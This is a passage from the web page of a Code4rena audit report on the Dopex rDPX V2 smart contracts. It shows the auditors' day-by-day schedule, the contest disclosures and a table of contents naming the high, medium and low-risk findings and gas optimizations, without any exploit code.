⏱</h3>\n<p>A total of <code>8 days</code> were dedicated to completing this audit, distributed as follows:</p>\n<ol>\n<li>1st Day: Devoted to comprehending the protocol’s functionalities and implementation.</li>\n<li>2nd Day: Initiated the analysis process, leveraging the documentation offered by the <code>Dopex Protocol</code>.</li>\n<li>3nd Day &#x26; 4rd Day: We dedicated ourselves to taking notes while reading through the contracts line by line.</li>\n<li>5th Day: From the notes taken, we decided what goes into the QA report and started it.</li>\n<li>6th Day: After finishing the QA, we started with some PoCs that we wanted to do to confirm our doubts about certain functions.</li>\n<li>7th Day: We focused on writing the reports for the medium findings we discovered.</li>\n<li>8rd Day: Focused on conducting a thorough analysis, incorporating meticulously crafted diagrams derived from the contracts and the note taken by us.</li>\n</ol>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Auditss incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .mtk17 { color: #808080; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-9\">High Risk Findings (9)</a></p>\n<ul>\n<li><a href=\"#h-01-improper-precision-of-strike-price-calculation-can-result-in-broken-protocol\">[H-01] Improper precision of strike price calculation can result in broken protocol</a></li>\n<li><a href=\"#h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos\">[H-02] Put settlement can be anticipated and lead to user losses and bonding DoS</a></li>\n<li><a href=\"#h-03-the-settle-feature-will-be-broken-if-attacker-arbitrarily-transfer-collateral-tokens-to-the-perpetualatlanticvaultlp\">[H-03] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP</a></li>\n<li><a href=\"#h-04-univ3liquidityamorecovererc721-will-cause-erc721-tokens-to-be-permanently-locked-in-rdpxv2core\">[H-04] <code>UniV3LiquidityAMO::recoverERC721</code> will cause <code>ERC721</code> tokens to be permanently locked in <code>rdpxV2Core</code></a></li>\n<li><a href=\"#h-05-users-can-get-immediate-profit-when-deposit-and-redeem-in-perpetualatlanticvaultlp\">[H-05] Users can get immediate profit when deposit and redeem in <code>PerpetualAtlanticVaultLP</code></a></li>\n<li><a href=\"#h-06-bond-operations-will-always-revert-at-certain-time-when-putoptionsrequired-is-true\">[H-06] Bond operations will always revert at certain time when <code>putOptionsRequired</code> is true</a></li>\n<li><a href=\"#h-07-incorrect-precision-assumed-from-rdpxpriceoracle-creates-multiple-issues-related-to-value-inflationdeflation\">[H-07] Incorrect precision assumed from RdpxPriceOracle creates multiple issues related to value inflation/deflation</a></li>\n<li><a href=\"#h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert\">[H-08] The peg stability module can be compromised by forcing lowerDepeg to revert</a></li>\n<li><a href=\"#h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool\">[H-09] <code>ReLPContract</code> wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-17\">Medium Risk Findings (17)</a></p>\n<ul>\n<li><a href=\"#m-01-bonding-weth-discounts-can-drain-weth-reserves-of-rdpxv2core-contract-to-zero\">[M-01] Bonding WETH discounts can drain WETH reserves of RdpxV2Core contract to zero</a></li>\n<li><a href=\"#m-02-the-vault-allows-free-swaps-from-weth-to-rdpx\">[M-02] The vault allows “free” swaps from WETH to RDPX</a></li>\n<li><a href=\"#m-03-no-mechanism-to-settle-out-of-money-put-options-even-after-bond-receipt-token-is-redeemed-\">[M-03] No mechanism to settle out-of-money put options even after Bond receipt token is redeemed. </a></li>\n<li><a href=\"#m-04-relp-mintokenaamount-the-calculations-are-wrong\">[M-04] reLP() mintokenAAmount the calculations are wrong</a></li>\n<li><a href=\"#m-05-_curveswap-getdpxethprice-and-getethprice-is-in-wrong-order\">[M-05] _curveSwap: getDpxEthPrice and getEthPrice is in wrong order</a></li>\n<li><a href=\"#m-06-missing-slippage-parameter-on-uniswap-addliquidity-function\">[M-06] Missing slippage parameter on Uniswap <code>addLiquidity()</code> function</a></li>\n<li><a href=\"#m-07-the-owner-of-rpdx-decaying-bonds-is-not-updated-on-token-transfers\">[M-07] The owner of RPDX Decaying Bonds is not updated on token transfers</a></li>\n<li><a href=\"#m-08-relpcontractrelp-is-susceptible-to-sandwich-attack-due-to-user-control-over-bond\">[M-08] <code>reLPContract.reLP()</code> is susceptible to sandwich attack due to user control over <code>bond()</code></a></li>\n<li><a href=\"#m-09--a-malicious-early-depositor-can-manipulate-the-lp-token-price-per-share-to-take-an-unfair-share-of-future-user-deposits-\">[M-09]  A malicious early depositor can manipulate the <code>LP-Token</code> price per share to take an unfair share of future user deposits </a></li>\n<li><a href=\"#m-10-change-of-fundingduration-causes-time-travel-of-perpetualatlanticvaultnextfundingpaymenttimestamp\">[M-10] Change of <code>fundingDuration</code> causes “time travel” of <code>PerpetualAtlanticVault.nextFundingPaymentTimestamp()</code></a></li>\n<li><a href=\"#m-11-user-that-delegate-eth-to-rdpxv2core-will-incur-loss-if-his-delegated-eth-fulfilled-by-decaying-bonds\">[M-11] User that delegate eth to <code>RdpxV2Core</code> will incur loss if his delegated eth fulfilled by decaying bonds</a></li>\n<li><a href=\"#m-12-user-can-avoid-paying-high-premium-price-by-correctly-timing-his-bond-call\">[M-12] User can avoid paying high premium price by correctly timing his bond call</a></li>\n<li><a href=\"#m-13-cannot-withdraw-rdpx-if-weth-withdrawn-is-zero\">[M-13] Cannot withdraw RDPX if WETH withdrawn is zero</a></li>\n<li><a href=\"#m-14-no-slippage-protection-for-bonders\">[M-14] No slippage protection for bonders</a></li>\n<li><a href=\"#m-15-sync-function-in-rdpxv2coresol-should-be-called-in-multiple-scenarios-to-account-for-the-balance-changes-that-occurs\">[M-15] <code>sync</code> function in <code>RdpxV2Core.sol</code> should be called in multiple scenarios to account for the balance changes that occurs</a></li>\n<li><a href=\"#m-16-inaccurate-swap-amount-calculation-in-relp-leads-to-stuck-tokens-and-lost-liquidity\">[M-16] Inaccurate swap amount calculation in ReLP leads to stuck tokens and lost liquidity</a></li>\n<li><a href=\"#m-17-the-rdpxv2core-contract-allows-anyone-to-call-redeem-tokens-even-if-the-contract-is-paused\">[M-17] The RdpxV2Core contract allows anyone to call redeem tokens even if the contract is paused</a></li>\n<li><a href=\"#m-18-return-values-of-approve-not-checked\">M-18 Return values of <code>approve()</code> not checked</a></li>\n<li><a href=\"#m-19-using-blocktimestamp-as-the-deadlineexpiry-invites-mev\">M-19 Using <code>block.timestamp</code> as the deadline/expiry invites MEV</a></li>\n<li><a href=\"#m-20-unsafe-use-of-transfertransferfrom-with-ierc20\">M-20 Unsafe use of <code>transfer()</code>/<code>transferFrom()</code> with <code>IERC20</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01---users-can-bond-without-providing-weth\">L-01 - Users can bond without providing WETH</a></li>\n<li><a href=\"#l-02---decreaseamount-function-name-is-misleading\">L-02 - <code>decreaseAmount</code> function name is misleading</a></li>\n<li><a href=\"#l-03---addassettotokenreserves-doesnt-check-that-there-is-no-token-with-the-same-symbol\">L-03 - <code>addAssetTotokenReserves()</code> doesn’t check that there is no token with the same symbol</a></li>\n<li><a href=\"#l-04---the-removeassetfromtokenreserves-removes-tokens-by-symbol-instead-of-per-address\">L-04 - The <code>removeAssetFromtokenReserves()</code> removes tokens by symbol instead of per address</a></li>\n<li><a href=\"#l-05---approvals-cant-be-completely-revoked\">L-05 - Approvals can’t be completely revoked</a></li>\n<li><a href=\"#l-06---unnecessary-role-check\">L-06 - Unnecessary role check</a></li>\n<li><a href=\"#l-07---rdpxv2core_role-is-not-assigned-in-perpetualatlanticvault\">L-07 - <code>RDPXV2CORE_ROLE</code> is not assigned in <code>PerpetualAtlanticVault</code></a></li>\n<li><a href=\"#refactor-01---unnecessary-struct-attribute-prefix\">Refactor-01 - Unnecessary struct attribute prefix</a></li>\n<li><a href=\"#refactor-02---repeated-expression\">Refactor-02 - Repeated expression</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#auditors-disclaimer\">Auditor’s Disclaimer</a></li>\n<li><a href=\"#note-on-gas-estimates\">Note on Gas estimates</a></li>\n<li><a href=\"#g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-8400-gas\">G-01 Using immutable on variables that are only set in the constructor and never after (Save 8400 Gas)</a></li>\n<li><a href=\"#g-02-use-a-constant-variable-for-roundingprecision-save-1-slot-21k-gas\">G-02 Use a constant variable for <code>roundingPrecision</code> (Save 1 SLOT: 2.1k Gas)</a></li>\n<li><a href=\"#g-03-tightly-pack-storage-variablesoptimize-the-order-of-variable-declaration\">G-03 Tightly pack storage variables/optimize the order of variable declaration</a></li>\n<li><a href=\"#g-04-function-calls-should-be-cached-instead-of-calling-them-more-than-once-in-same-transaction\">G-04 Function calls should be cached instead of calling them more than once in same transaction</a></li>\n<li><a href=\"#g-05-use-calldata-instead-of-memory-for-function-parameters\">G-05 Use calldata instead of memory for function parameters</a></li>\n<li><a href=\"#g-06-use-uint256-instead-of-the-counter-library\">G-06 Use uint256 instead of the counter library</a></li>\n<li><a href=\"#g-07-since-we-are-assigning-local-values-to-the-struct-we-shouldnt-read-the-structstate-in-the-same-transactions-simply-use-the-local-variables-save-427-gas\">G-07 Since we are assigning local values to the struct, we shouldn’t read the struct(state) in the same transactions, simply use the local variables (Save 427 Gas)</a></li>\n<li><a href=\"#g-08-when-using-storage-instead-of-memory-we-should-cache-any-fields-that-need-to-be-re-read-in-stack-variables\">G-08 When using storage instead of memory, we should cache any fields that need to be re-read in stack variables</a></li>\n<li><a href=\"#g-9-we-can-cache-some-gas-intensive-operations\">G-9 We can cache some gas intensive operations</a></li>\n<li><a href=\"#g-10-we-can-avoid-reading-from-state-here\">G-10 We can avoid reading from state here</a></li>\n<li><a href=\"#g-11-since-we-have-cached-values-we-should-reference-them-instead-of-making-a-state-read\">G-11 Since we have cached values, we should reference them instead of making a state read</a></li>\n<li><a href=\"#conclusion-1\">Conclusion</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#audit-analysis\">Audit Analysis</a></p>\n<ul>\n<li><a href=\"#description-overview-of-dopex-protocol\">Description overview of Dopex Protocol</a></li>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#1--approach-we-followed-when-reviewing-the-code\">1- Approach we followed when reviewing the code</a></li>\n<li><a href=\"#2--analysis-of-the-code-base\">2- Analysis of the code base</a></li>\n<li><a href=\"#3--architecture-of-the-rdpx-v2\">3- Architecture of the rDPX V2</a></li>\n<li><a href=\"#4--documents\">4- Documents</a></li>\n<li><a href=\"#5--systemic--centralization-risks\">5- Systemic &#x26; Centralization Risks</a></li>\n<li><a href=\"#6--new-insights-and-learning-from-this-audit\">6- New insights and learning from this audit</a></li>\n<li><a href=\"#7--test-analysis\">7- Test analysis</a></li>\n<li><a href=\"#conclusion-2\">Conclusion</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}